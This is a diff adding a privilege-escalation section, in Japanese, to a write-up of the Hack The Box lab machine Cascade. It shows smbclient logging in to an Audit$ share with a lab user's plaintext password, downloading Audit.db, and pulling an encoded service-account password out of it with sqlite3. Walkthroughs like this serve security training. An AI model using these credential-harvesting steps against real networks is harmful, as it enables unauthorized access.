@@ -210,4 +210,44 @@ VNC Install.regというファイルにパスワードのhex表記があるの�
 cascade\s.smith
 ```
 
+# Privesc
 
+r.thompsonのクリデンシャルではSMBシェアのAudit$というフォルダが閲覧できなかったが、次のようにs.smithのそれでは閲覧可能：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Audit]
+└─$ smbclient -U s.smith%sT333ve2 '//10.10.10.182/Audit$'  
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Jan 30 03:01:26 2020
+  ..                                  D        0  Thu Jan 30 03:01:26 2020
+  CascAudit.exe                      An    13312  Wed Jan 29 06:46:51 2020
+  CascCrypto.dll                     An    12288  Thu Jan 30 03:00:20 2020
+  DB 
+...
+smb: \> cd DB
+smb: \DB\> dir
+  .                                   D        0  Wed Jan 29 06:40:59 2020
+  ..                                  D        0  Wed Jan 29 06:40:59 2020
+  Audit.db                           An    24576  Wed Jan 29 06:39:24 2020
+
+smb: \DB\> get Audit.db
+```
+
+このデータベースを調べると、ArkSvcのパスワードを発見：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Audit]
+└─$ sqlite3 'DB\Audit.db'
+sqlite> .tables
+DeletedUserAudit  Ldap              Misc            
+sqlite> .schema Ldap
+CREATE TABLE IF NOT EXISTS "Ldap" (
+	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
+	"uname"	TEXT,
+	"pwd"	TEXT,
+	"domain"	TEXT
+);
+sqlite> select * from Ldap;
+1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+```
